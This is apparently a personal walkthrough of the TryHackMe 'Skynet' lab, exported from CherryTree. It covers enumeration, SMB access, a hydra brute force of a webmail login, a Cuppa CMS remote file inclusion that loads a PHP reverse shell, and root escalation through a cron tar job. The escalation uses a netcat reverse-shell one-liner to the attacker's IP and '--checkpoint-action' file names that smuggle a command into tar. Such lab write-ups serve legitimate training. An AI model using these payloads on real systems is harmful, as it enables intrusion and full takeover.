<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>skynet</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>skynet</h1><br/><strong><h1>THM SKYNET</h1></strong><br /><br /><br /><strong><h2>Enumeration</h2></strong><br />nmap -sV -sC -O -vv 10.10.68.116<br /><br />We find a webserver on 80<br />smb on 445<br /><br />And some mail ports at 110 &amp; 143 (Not used for exploitation)<br /><br />we open the webpage to have a blank skynet search page.<br />(Nothing intresting here)<br /><br />Next we use gobuster to find out hidden directories.<br /><br /><img src="images/10-1.png" alt="images/10-1.png" /><br /><br />Most of the directores in the output are not accessible.<br />Code 301: Means Permanently moved<br /><br />Still <strong>http://10.10.68.116/squirrelmail</strong> will take us to a mail login page.<br /><br />We do not have any credentials yet.<br /><br /><br />I start enuerating samba shares &amp; users.<br /><em><strong>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.68.116</strong></em><br /><br /><img src="images/10-2.png" alt="images/10-2.png" /><br /><br /><img src="images/10-3.png" alt="images/10-3.png" /><br /><br />We find one user: <em><strong>milesdyson</strong></em><br />We also find 2 user shares: <strong>\\10.10.68.116\anonymous</strong> &amp; <strong>\\10.10.68.116\milesdyson</strong><br /><br /><br />Guest Access is not allowed in <strong>\\10.10.68.116\milesdyson</strong><br />However, Guest Access is allowed in <strong>\\10.10.68.116\anonymous</strong><br /><br />We check the share for further info<br /><br /><em><strong>smbclient //10.10.68.116/anonymous -U guest</strong></em><br /><br /><img src="images/10-4.png" alt="images/10-4.png" /><br /><br />We download the two files with data. <strong>Attention.txt</strong> and <strong>log1.txt</strong><br /><br /><strong>Attention.txt</strong> : A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.<br />-Miles Dyson<br /><br /><strong>log1.txt:</strong> Looks like a file containing passwords. (May be some of them are still in use)<br /><br /><br />Now, i try to use the passwords in the log1.txt to bruteforce the samba share of milesdyson using <strong>hydra</strong>.<br /><br /><img src="images/10-5.png" alt="images/10-5.png" /><br /><br />But as we see there is no success.<br /><br />Next, I try to use the same set of passwords for the squirrel mail login using <strong>hydra</strong><br /><br />I capture the request of a test login using burpsuite and record the error.<br /><br /><strong>Burp Request:</strong><br />POST /squirrelmail/src/redirect.php HTTP/1.1<br />Host: 10.10.68.116<br />User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br />Accept-Language: en-US,en;q=0.5<br />Accept-Encoding: gzip, deflate<br />Content-Type: application/x-www-form-urlencoded<br />Content-Length: 84<br />Origin: <a href="http://10.10.68.116">http://10.10.68.116</a><br />Connection: close<br />Referer: <a href="http://10.10.68.116/squirrelmail/src/login.php">http://10.10.68.116/squirrelmail/src/login.php</a><br />Cookie: SQMSESSID=ak2eqf48ns0o4a8el0eu1a72v3<br />Upgrade-Insecure-Requests: 1<br /><br />login_username=milesdyson&amp;secretkey=Bazinga&amp;js_autodetect_results=1&amp;just_logged_in=1<br /><br /><strong>Error Message:</strong><br />Unknown user or password incorrect.<br /><br />Now using the above data and the error message received. I crafted the hydra command as follows.<br /><br /><img src="images/10-6.png" alt="images/10-6.png" /><br /><br />Thus we find the mail password: <em><strong>cyborg007haloterminator</strong></em><br /><br />Then we use the following credentials to get into the mailbox.<br />Username	:	<em><strong>milesdyson</strong></em><br />Password		:	<em><strong>cyborg007haloterminator</strong></em><br /><br />Inside the inbox we find SMB password to <em><strong>miledyson</strong></em>.<br /><br />Next we enumerate the SMB share of miledyson.<br /><br /><em><strong>smbclient //10.10.68.116/milesdyson -U milesdyson</strong></em><br /><br />We find an important.txt<br /><br /><img src="images/10-7.png" alt="images/10-7.png" /><br /><br /><br />As we now know the CMS portal url. We go back to gobuster with this hidden directory to find some thing.<br /><br /><img src="images/10-8.png" alt="images/10-8.png" /><br /><br />Here we find a directory called Administrator. We visit the link. <em><strong>http://10.10.68.116/45kra24zxs28v3yd/administrator</strong></em><br /><br />We get a “<strong>cuppa CMS Login Page</strong>”<br /><br /><em><strong>searchsploit cuppa cms</strong></em><br /><br /><img src="images/10-9.png" alt="images/10-9.png" /><br /><br /><img src="images/10-10.png" alt="images/10-10.png" /><br /><br />Next we study the 25971.txt file. See the following part<br />#####################################################<br />EXPLOIT<br />#####################################################<br /><br />http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt<br />http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd<br /><br />We can test this in our case by the following:<br /><em><strong>http://10.10.68.116/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=/etc/passwd</strong></em><br /><br />We will get the /etc/passwd file of the target on the webpage indicating LFI.<br />However, we will use <strong>RFI</strong> here.<br /><br /><br /><br /><strong><h2>FootHold</h2></strong><br /><br />We host the <em><strong>php-reverse-shell.php</strong></em> file in a python web server. Then use the following URL as payload.<br /><br />1. Start a netcat listener as per the php reverse shell data.<br />2. Use the URL <em><strong>http://10.10.68.116/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.72.31/php-reverse-shell.php</strong></em><br />3. This will trigger the reverse shell and we will get the user flag.<br /><br /><strong><h2>Privelege Escalation</h2></strong><br /><br />We view the crontab file to get the following details.<br /><em><strong>cat /etc/crontab</strong></em><br /><br />We browse “milesdyson” home directory and find a backup folder.<br /><br />Inside backup folder, we find the backup.sh script which is run by root every 1 min.<br />This script makes a tar backup of /var/www/html<br /><br />Inside we find <strong>tar</strong> command. Then look at GTFObins of how to escalate it.<br /><br />We create the following files inside /var/ww/html<br />Exact commands should be used for creating the files else we may face error.<br /><br /><em><strong>echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.11.72.31 8888 &gt;/tmp/f&quot; &gt; shell</strong></em><br /><em><strong>touch /var/www/html/--checkpoint=1</strong></em><br /><em><strong>touch /var/www/html/&quot;--checkpoint-action=exec=bash shell&quot;</strong></em> Or <em><strong>touch /var/www/html/--checkpoint-action=exec=bash\ shell</strong></em><br /><br />Remember to to have a netcat listner ready. Within 1 minute we will get a reverse shell as root.<br />Get the root flag at /root/root.txt<br /><br />Thanks !!</div>
</body>
</html>
